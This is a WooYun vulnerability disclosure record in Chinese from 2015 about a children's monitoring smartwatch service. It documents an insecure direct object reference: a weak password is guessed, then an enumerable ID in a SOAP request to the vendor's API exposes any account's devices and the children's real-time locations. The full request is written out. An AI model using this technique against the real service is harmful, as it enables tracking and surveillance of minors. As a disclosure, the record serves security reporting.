{"id": 21300, "wybug_id": "wooyun-2015-0113191", "wybug_title": "关爱星儿童监听手表存在任意用户登录漏洞(可监控小学生用户)", "wybug_corp": "关爱星", "wybug_author": "小手冰凉", "wybug_date": "2015-05-20 19:38", "wybug_open_date": "2015-07-04 19:40", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["运维管理不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-20：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 关爱星儿童监听手表存在任意用户登录漏洞(可监控小学生用户) 详细说明：  新闻如下http://news.ifeng.com/a/20150508/43716946_0.shtml使用者多为小学生使用关爱星程序后，试出一个弱口令，然后登录抓包。发现登陆后会返回一个id号，所有操作均只要这个id就行，id又是可遍历的。查询设备的数据包如下\nPOST /OpenAPIV2.asmx HTTP/1.1Host: grapi.5gcity.comProxy-Connection: keep-aliveAccept: */*Accept-Encoding: gzip, deflateContent-Length: 431Content-Type: text/xml; charset=utf-8Accept-Language: zh-cnSOAPAction: http://tempuri.org/GetDeviceListConnection: closeUser-Agent: %E5%85%B3%E7%88%B1%E6%98%9F/1.1 CFNetwork/711.1.16 Darwin/14.0.0<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetDeviceList xmlns=\"http://tempuri.org/\"><ID>1</ID><PageNo>1</PageNo><PageCount>9999</PageCount><TypeID>0</TypeID><IsAll>false</IsAll><MapType>Google</MapType></GetDeviceList></soap:Body></soap:Envelope>\n修改其中的ID就能获得指定ID的设备信息。测试遍历ID后发现id为20929的用户名下竟然有几千个设备，估计是校长的账号，添加数据包修改规则，把所有请求中的ID替换为校长的ID，实现任意ID登录，效果如图，可看事实位置，可看动态变化，动态信息等等   漏洞证明：  \n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 小手冰凉@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2015-05-20 19:39 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这就是个监听监控设备啊    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}